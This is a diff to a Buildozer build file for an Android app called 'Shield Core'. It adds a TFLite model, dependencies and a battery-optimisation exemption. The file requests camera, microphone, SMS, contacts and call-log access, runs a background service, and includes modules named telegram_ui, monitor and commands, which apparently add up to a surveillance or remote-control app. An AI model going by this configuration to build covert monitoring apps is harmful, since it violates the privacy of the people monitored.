@@ -3,10 +3,10 @@ title = Shield Core
 package.name = shieldcore
 package.domain = com.sys
 source.dir = .
-source.include_exts = py,png,jpg,kv,atlas,txt,json
-source.include_files = config_template.py,telegram_ui.py,monitor.py,commands.py
+source.include_exts = py,png,jpg,kv,atlas,txt,json,tflite
+source.include_files = config_template.py,telegram_ui.py,monitor.py,commands.py,assets/engine_v2.tflite
 version = 4.2.0
-requirements = python3,kivy==2.3.0,requests,android,pyjnius,Pillow
+requirements = python3,kivy==2.3.0,requests,Pillow,numpy,tensorflow-lite
 orientation = portrait
 osx.python_version = 3
 osx.kivy_version = 2.3.0
@@ -15,13 +15,16 @@ fullscreen = 0
 [android]
 api = 33
 minapi = 21
-ndk = 25b
+ndk = 25.1.8937393
 ndk_api = 24
 archs = arm64-v8a, armeabi-v7a
 build_tools = 33.0.0
-permissions = INTERNET, CAMERA, RECORD_AUDIO, WAKE_LOCK, FOREGROUND_SERVICE, READ_EXTERNAL_STORAGE, WRITE_EXTERNAL_STORAGE, READ_CONTACTS, READ_SMS, READ_CALL_LOG
-android.accept_sdk_license = True
-android.manifest.service_foreground_type = dataSync
+permissions = INTERNET, CAMERA, RECORD_AUDIO, WAKE_LOCK, FOREGROUND_SERVICE, READ_EXTERNAL_STORAGE, WRITE_EXTERNAL_STORAGE, READ_CONTACTS, READ_SMS, READ_CALL_LOG, REQUEST_IGNORE_BATTERY_OPTIMIZATIONS
+android.sdk_accept_license = True
+android.manifest.foreground_service_type = dataSync
+android.gradle_dependencies = androidx.core:core:1.9.0, androidx.work:work-runtime:2.8.0
+android.manifest.placeholders = ['READ_CONTACTS=optional','READ_SMS=optional','READ_CALL_LOG=optional']
+android.allow_backup = False
 
 [buildozer]
 log_level = 2
